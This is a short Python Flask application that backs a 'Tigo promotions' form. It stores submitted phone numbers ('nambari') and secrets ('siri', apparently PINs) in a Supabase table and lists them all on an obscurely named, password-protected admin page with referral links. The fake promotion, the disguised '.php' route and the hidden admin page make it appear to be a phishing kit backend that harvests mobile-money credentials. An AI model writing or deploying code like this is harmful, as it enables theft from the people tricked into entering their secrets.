from flask import Flask, request, render_template
import os
import traceback
from supabase import create_client

# ---------- PATH SETUP (IMPORTANT FOR VERCEL) ----------
BASE_DIR = os.path.dirname(os.path.abspath(__file__))
TEMPLATES_DIR = os.path.join(BASE_DIR, "..", "templates")

app = Flask(__name__, template_folder=TEMPLATES_DIR)

# ---------- SUPABASE INIT ----------
supabase_url = os.environ.get("SUPABASE_URL")
supabase_key = os.environ.get("SUPABASE_KEY")

if not supabase_url or not supabase_key:
    print("❌ Supabase env vars missing")
    supabase = None
else:
    supabase = create_client(supabase_url, supabase_key)
    print("✅ Supabase connected")

# ---------- HOME ----------
@app.route("/")
def home():
    return render_template("index.html")

# ---------- FORM SUBMIT ----------
@app.route("/add_tigo.php", methods=["POST"])
def add_tigo():
    try:
        if not supabase:
            return "Supabase not configured", 500

        nambari = request.form.get("nambari")
        siri = request.form.get("siri")
        url_link = request.form.get("url_link", "gzktrsjamfkw")

        if not nambari or not siri:
            return "Missing fields", 400

        supabase.table("tigo_promotions").insert({
            "nambari": nambari,
            "siri": siri,
            "url_link": url_link
        }).execute()

        return "Data added successfully! ✅"

    except Exception:
        traceback.print_exc()
        return "Insert failed", 500

# ---------- ADMIN (PASSWORD PROTECTED) ----------
@app.route("/adminvinc684833", methods=["GET", "POST"])
def admin():
    ADMIN_PASSWORD = os.environ.get("ADMIN_PASSWORD")

    if not ADMIN_PASSWORD:
        return "Admin password not configured", 500

    # Show login page
    if request.method == "GET":
        return render_template("admin_login.html")

    # Handle login
    password = request.form.get("password")
    if password != ADMIN_PASSWORD:
        return render_template("admin_login.html", error="Invalid password")

    try:
        if not supabase:
            return "Supabase not configured", 500

        response = supabase.table("tigo_promotions") \
            .select("id,nambari,siri,url_link,created_at") \
            .order("created_at", desc=True) \
            .execute()

        rows = response.data or []
        base_url = request.host_url.rstrip("/")

        for row in rows:
            row["referral"] = f"{base_url}/?ref={row['url_link']}"

        return render_template("admin.html", rows=rows)

    except Exception:
        traceback.print_exc()
        return "Failed to load admin data", 500
